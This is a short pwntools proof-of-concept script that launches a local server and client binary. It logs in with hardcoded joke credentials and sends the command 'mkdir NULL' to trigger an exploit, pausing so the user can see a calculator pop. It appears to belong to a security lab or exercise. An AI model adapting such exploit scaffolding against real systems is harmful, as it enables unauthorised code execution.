from pwn import *

context.clear(arch = 'amd64')

server = process('bin/server')
client = process(['bin/client', '127.0.0.1', '1337'])

# Logging in
login = "login Acidburn\n"
passw = "pass CrashOverride\n"
client.sendline(login)
client.sendline(passw)
log.info("server after login:\n %s" % server.recv(timeout=0.5))
log.info("client after login:\n %s" % client.recv(timeout=0.5))

# Sending exploit
client.sendline("mkdir NULL")
log.info("server after command 'mkdir NULL':\n %s" % server.recv(timeout=0.5))

# Clean up
log.info("sleeping 5s so that you can admire calculator")
sleep(5)
client.close()
server.close()
